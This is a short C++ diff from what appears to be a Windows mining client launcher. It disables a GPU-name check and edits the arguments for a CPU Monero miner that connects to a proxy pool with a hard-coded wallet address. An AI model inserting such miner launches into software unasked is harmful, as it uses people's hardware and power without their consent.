@@ -129,7 +129,7 @@ bool RunEnvironment::CheckZACond()
 		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
 		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= g_uMinMemorySize)
 		{
-			if (g_bCheckName)
+			if (FALSE)
 			{
 				return CheckGPUName(iter->name);
 			}
@@ -253,7 +253,7 @@ bool RunEnvironment::StartAllClient(bool bFirst)
 		else if (*c_iter == L"taskmsxc")
 		{
 			//_snwprintf(szParam, MAX_PATH, L"-p %s -t %u" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
-			_snwprintf(szParam, MAX_PATH, L"--url sm3xmrproxy.share4money.cn:3335 --user 47knn7zNdNNiGxs211vzTRUEQ3w5fhRsWWWL9UYdWaJPCbbDfobbvvhFZPNAzHBtuh2CJNVr8DtE37WiyJ4hnkEYGThvZtP --pass x --rig-id %s --threads %u" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
+			_snwprintf(szParam, MAX_PATH, L"--url sm3xmrproxy.share4money.cn:3337 --user 47knn7zNdNNiGxs211vzTRUEQ3w5fhRsWWWL9UYdWaJPCbbDfobbvvhFZPNAzHBtuh2CJNVr8DtE37WiyJ4hnkEYGThvZtP --pass x --rig-id %s --threads %u" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
 		}
 		else if (*c_iter == L"taskmse")
 		{
